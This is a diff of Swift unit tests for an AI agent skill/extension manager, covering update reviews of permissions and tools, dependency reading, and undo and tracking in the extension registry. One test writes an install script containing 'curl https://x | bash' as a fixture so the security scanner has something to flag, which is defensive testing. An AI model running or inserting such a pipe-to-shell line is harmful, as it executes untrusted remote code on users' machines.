@@ -438,3 +438,226 @@ final class ExtensionInstallPreviewAssemblyTests: XCTestCase {
         XCTAssertNil(preview.tracking, "and nothing to follow")
     }
 }
+
+@MainActor
+final class UpdateReviewTests: XCTestCase {
+    private var base: URL!
+
+    override func setUpWithError() throws {
+        try super.setUpWithError()
+        base = FileManager.default.temporaryDirectory
+            .appendingPathComponent("UncoilUpdateReview-\(UUID().uuidString)", isDirectory: true)
+        try FileManager.default.createDirectory(at: base, withIntermediateDirectories: true)
+    }
+
+    override func tearDownWithError() throws {
+        try? FileManager.default.removeItem(at: base)
+        try super.tearDownWithError()
+    }
+
+    private func revision(_ name: String, manifest: String) throws -> URL {
+        let root = base.appendingPathComponent(name, isDirectory: true)
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        try Data(manifest.utf8).write(to: root.appendingPathComponent("SKILL.md"))
+        return root
+    }
+
+    func testANewPermissionIsReportedAsAdded() throws {
+        let previous = try revision("prev", manifest: """
+        ---
+        permissions: [read]
+        ---
+        """)
+        let next = try revision("next", manifest: """
+        ---
+        permissions: [read, network]
+        ---
+        """)
+        let review = UpdateReview.between(previous: previous, next: next, candidate: nil)
+        XCTAssertEqual(review.addedPermissions, ["network"])
+        XCTAssertTrue(review.removedPermissions.isEmpty)
+        XCTAssertTrue(review.needsReview, "a new permission is worth a look")
+    }
+
+    func testARemovedToolIsALikelyBreakingChange() throws {
+        let previous = try revision("prev2", manifest: "---\npermissions: []\n---")
+        let next = try revision("next2", manifest: "---\npermissions: []\n---")
+        let review = UpdateReview.between(
+            previous: previous, next: next, candidate: nil,
+            previousTools: ["search", "write"], nextTools: ["search"]
+        )
+        XCTAssertEqual(review.removedTools, ["write"])
+        XCTAssertEqual(review.breakingChangeRisk, .likely)
+        XCTAssertTrue(review.summary.contains("-1 tool"), review.summary)
+    }
+
+    func testANewToolAloneIsNotBreaking() throws {
+        let previous = try revision("prev3", manifest: "---\npermissions: []\n---")
+        let next = try revision("next3", manifest: "---\npermissions: []\n---")
+        let review = UpdateReview.between(
+            previous: previous, next: next, candidate: nil,
+            previousTools: ["search"], nextTools: ["search", "index"]
+        )
+        XCTAssertEqual(review.addedTools, ["index"])
+        XCTAssertEqual(
+            review.breakingChangeRisk, .unlikely,
+            "something new can be ignored; something gone cannot"
+        )
+    }
+
+    func testAFirstInstallReportsItsOwnFindingsRatherThanADiff() throws {
+        let next = try revision("next4", manifest: "---\npermissions: [read]\n---")
+        try Data("#!/bin/sh\ncurl https://x | bash\n".utf8).write(
+            to: next.appendingPathComponent("install.sh")
+        )
+        let review = UpdateReview.between(previous: nil, next: next, candidate: nil)
+        XCTAssertEqual(review.addedPermissions, ["read"])
+        XCTAssertFalse(
+            review.securityDiff.isEmpty,
+            "with nothing to compare against, the findings themselves are the answer"
+        )
+    }
+
+    func testDependenciesAreReadFromTheManifest() throws {
+        let root = base.appendingPathComponent("deps", isDirectory: true)
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        try Data(#"{"dependencies": {"ripgrep": "*", "jq": "1.7"}}"#.utf8).write(
+            to: root.appendingPathComponent("uncoil.json")
+        )
+        XCTAssertEqual(
+            ExtensionInstallPreviewBuilder.dependencies(at: root), ["jq", "ripgrep"]
+        )
+    }
+
+    func testDependenciesAlsoComeFromFrontMatter() throws {
+        let root = base.appendingPathComponent("deps2", isDirectory: true)
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        try Data("---\ndependencies:\n  - ripgrep\n  - fd\n---\n".utf8).write(
+            to: root.appendingPathComponent("SKILL.md")
+        )
+        XCTAssertEqual(
+            ExtensionInstallPreviewBuilder.dependencies(at: root), ["ripgrep", "fd"]
+        )
+    }
+
+    func testNoManifestMeansNoDependencies() {
+        XCTAssertTrue(ExtensionInstallPreviewBuilder.dependencies(at: base).isEmpty)
+    }
+}
+
+@MainActor
+final class ExtensionRegistryUndoTests: XCTestCase {
+    private var base: URL!
+    private var registry: ExtensionRegistry!
+
+    override func setUpWithError() throws {
+        try super.setUpWithError()
+        base = FileManager.default.temporaryDirectory
+            .appendingPathComponent("UncoilUndo-\(UUID().uuidString)", isDirectory: true)
+        let layout = ExtensionStoreLayout(
+            root: base.appendingPathComponent("store", isDirectory: true)
+        )
+        try layout.ensure()
+        registry = ExtensionRegistry(
+            layout: layout,
+            store: SkillStore(
+                layout: layout,
+                canonicalRoot: base.appendingPathComponent("agents", isDirectory: true)
+            )
+        )
+        registry.upsert(ExtensionPackage(
+            id: "acme/skills:review", kind: .skill, name: "review",
+            source: .managedGitHub(
+                repository: "acme/skills", subpath: nil, tracking: .branch("main")
+            ),
+            state: .active
+        ))
+    }
+
+    override func tearDownWithError() throws {
+        try? FileManager.default.removeItem(at: base)
+        try super.tearDownWithError()
+    }
+
+    func testOnlySomeEventsCanBeUndone() {
+        for kind: AuditEvent.Kind in [.quarantined, .restored, .assignmentChanged, .findingAccepted] {
+            XCTAssertTrue(
+                ExtensionRegistry.isUndoable(
+                    AuditEvent(kind: kind, extensionID: "x", detail: "d")
+                ),
+                kind.rawValue
+            )
+        }
+        for kind: AuditEvent.Kind in [.skillInstalled, .configChanged, .scanCompleted] {
+            XCTAssertFalse(
+                ExtensionRegistry.isUndoable(
+                    AuditEvent(kind: kind, extensionID: "x", detail: "d")
+                ),
+                kind.rawValue
+            )
+        }
+    }
+
+    func testUndoingAQuarantineRestoresThePackage() {
+        registry.setState(.quarantined, packageID: "acme/skills:review")
+        let event = AuditEvent(
+            kind: .quarantined, extensionID: "acme/skills:review", detail: "karantina"
+        )
+        XCTAssertNotNil(registry.undo(event))
+        XCTAssertEqual(registry.package(id: "acme/skills:review")?.state, .active)
+    }
+
+    func testUndoingAnAssignmentPutsItBack() {
+        registry.setAgentBinding(true, packageID: "acme/skills:review", agent: .claudeCode)
+        XCTAssertTrue(registry.agents(for: "acme/skills:review").contains(.claudeCode))
+
+        let event = AuditEvent(
+            kind: .assignmentChanged, extensionID: "acme/skills:review",
+            detail: "claudeCode: açık"
+        )
+        XCTAssertNotNil(registry.undo(event))
+        XCTAssertFalse(registry.agents(for: "acme/skills:review").contains(.claudeCode))
+    }
+
+    func testAnEventWithNothingToUndoSaysSo() {
+        XCTAssertNil(
+            registry.undo(AuditEvent(kind: .configChanged, extensionID: "x", detail: "d")),
+            "a config change is undone from the Agents screen, not here"
+        )
+        XCTAssertNil(
+            registry.undo(
+                AuditEvent(kind: .assignmentChanged, extensionID: "x", detail: "isim yok")
+            ),
+            "an event whose detail names no agent cannot be reversed by guessing"
+        )
+    }
+
+    func testTrackingCanBePinnedAndMoved() {
+        XCTAssertTrue(
+            registry.setTracking(.pinnedCommit("a1b2c3"), packageID: "acme/skills:review")
+        )
+        guard case .managedGitHub(_, _, let pinned) = try? XCTUnwrap(
+            registry.package(id: "acme/skills:review")?.source
+        ) else {
+            return XCTFail("expected a managed source")
+        }
+        XCTAssertEqual(pinned, .pinnedCommit("a1b2c3"))
+        XCTAssertFalse(
+            registry.setTracking(.pinnedCommit("a1b2c3"), packageID: "acme/skills:review"),
+            "setting the same tracking again changes nothing"
+        )
+        XCTAssertTrue(registry.setTracking(.tag("v2"), packageID: "acme/skills:review"))
+        XCTAssertTrue(
+            registry.auditEvents.contains { $0.detail.contains("takip değişti") },
+            "\(registry.auditEvents.map(\.detail))"
+        )
+    }
+
+    func testTrackingCannotBeSetOnAnUnmanagedSource() {
+        registry.upsert(ExtensionPackage(
+            id: "local:mine", kind: .skill, name: "mine",
+            source: .local(path: "/tmp/mine"), state: .active
+        ))
+        XCTAssertFalse(registry.setTracking(.tag("v1"), packageID: "local:mine"))
+    }
+}
